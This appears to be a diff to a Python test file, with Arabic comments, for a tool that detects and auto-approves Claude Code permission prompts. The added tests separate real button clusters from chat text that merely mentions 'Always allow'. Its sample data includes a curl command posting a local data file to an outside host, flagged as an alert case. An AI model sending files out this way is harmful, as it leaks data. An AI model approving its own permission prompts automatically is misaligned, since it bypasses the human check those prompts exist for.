@@ -35,8 +35,10 @@ curl -X POST https://x.com -d @data.json
 Always allow
 Allow once""", "alert", True),
 
+    # الواجهة الحقيقية تعرض Deny دائماً، حتى حين يكون خيار السماح واحداً
     ("خيار واحد فقط", """Bash command
 git status
+Deny
 Allow once
 Ctrl Enter""", "approve", False),
 
@@ -128,6 +130,7 @@ def run() -> int:
 
     print()
     failures.extend(test_real_window())
+    failures.extend(test_button_cluster())
 
     print()
     if failures:
@@ -191,6 +194,52 @@ def test_real_window() -> list[str]:
 
     print(f"  {'✅' if not problems else '❌'} نافذة حقيقية: الأداة={tool} "
           f"الحكم={analysis.verdict} أجزاء={len(analysis.parts)}")
+    return problems
+
+
+# ====== محادثة تتحدّث عن الأزرار — يجب ألّا تُعدّ طلب إذن ======
+# هذه الحالة أوقعت الأداة فعلاً: نافذة المتصفّح عرضت محادثةً عن الأداة
+# نفسها، فورد فيها ذكر «Always allow» ككلامٍ لا كزرّ، فظُنّ طلباً.
+CHATTER_ABOUT_BUTTONS = """Claude Code
+Message 41
+Claude responded: البطاقة تعرض الاقتراح
+كان التشخيص السابق يبحث في النوافذ التي عنوانها يحتوي claude فقط
+حروف   علامات إذن   الصنف                    العنوان
+18420   always allow  Chrome_WidgetWin_1   Claude
+2402                  Chrome_WidgetWin_1   Claude Code - Brave
+مرحلة ٢: يقرأ بعمق النوافذ التي تحمل علامات إذن
+Usage: 30% of 5-hour limit
+Notifications"""
+
+# طلب حقيقي: الأزرار متجاورة
+REAL_BUTTONS = """Claude Code
+Allow Claude to run tests?
+npm test
+Deny
+1
+Esc
+Always allow
+2
+Allow once
+3"""
+
+
+def test_button_cluster() -> list[str]:
+    from claude_auto_approve import detect_prompt
+
+    problems = []
+
+    if detect_prompt(CHATTER_ABOUT_BUTTONS) is not None:
+        problems.append("❌ حديثٌ عن الأزرار عُدّ طلب إذن")
+    print(f"  {'✅' if not problems else '❌'} محادثة تذكر «Always allow» → ليست طلباً")
+
+    prompt = detect_prompt(REAL_BUTTONS)
+    if prompt is None:
+        problems.append("❌ طلب حقيقي (أزرار متجاورة) لم يُكتشف")
+    elif not prompt.has_always:
+        problems.append("❌ لم يُكتشف زرّ Always allow في طلب حقيقي")
+    print(f"  {'✅' if prompt else '❌'} أزرار متجاورة → طلب إذن حقيقي")
+
     return problems
 
 
